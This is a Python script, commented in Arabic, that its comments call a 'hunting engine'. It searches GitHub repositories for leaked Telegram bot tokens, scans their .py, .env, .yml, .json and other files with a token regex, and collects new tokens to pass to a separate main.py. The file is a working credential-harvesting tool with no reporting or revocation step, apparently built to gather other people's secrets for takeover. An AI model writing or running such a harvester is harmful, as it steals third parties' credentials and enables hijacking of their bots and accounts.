import re
import os
import logging
from github import Github, RateLimitExceededException

# إعداد السجلات (Logs)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# إعدادات الاتصال
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

# "ذاكرة" مؤقتة لمنع إرسال التوكنات المكررة لـ main.py أثناء عمل البوت
session_seen_tokens = set()

def search_for_tokens():
    """
    محرك الصيد المتكامل
    - متوافق مع Threading
    - محصن ضد أخطاء الـ API
    - يمنع تكرار إرسال التوكنات المكتشفة
    """
    found_tokens = []
    logger.info("Scanner Engine: Starting search sequence...")

    try:
        # البحث عن المستودعات (20 نتيجة في كل دورة)
        repositories = g.search_repositories(query="telegram_bot_token", sort="updated")[:20]
        
        for repo in repositories:
            # فلترة الجودة: تجاهل المستودعات الضعيفة
            if repo.stargazers_count < 5:
                continue
            
            logger.info(f"Scanning Repository: {repo.full_name}")
            
            try:
                contents = repo.get_contents("")
                for content in contents:
                    # فحص كافة أنواع الملفات التي قد تحتوي على توكنات
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml', '.json', '.txt', '.conf')):
                        file_content = content.decoded_content.decode('utf-8', errors='ignore')
                        
                        # استخراج التوكنات بنمط Regex الدقيق
                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
                        
                        for token in set(tokens):
                            # إذا كان التوكن جديداً ولم نره في هذه الجلسة، أضفه للقائمة
                            if token not in session_seen_tokens:
                                session_seen_tokens.add(token)
                                found_tokens.append(token)
                                logger.info(f"New candidate found: {token[:10]}... in {repo.full_name}")
            
            except Exception as e:
                # تجاهل الخطأ في ملف واحد والاستمرار لباقي الملفات
                continue
                
    except RateLimitExceededException:
        logger.critical("GitHub API limit reached! Sleeping to prevent ban.")
    except Exception as e:
        logger.error(f"Critical Scanner Failure: {e}")
        
    logger.info(f"Scanner Cycle Complete. Total unique new candidates: {len(found_tokens)}")
    return found_tokens
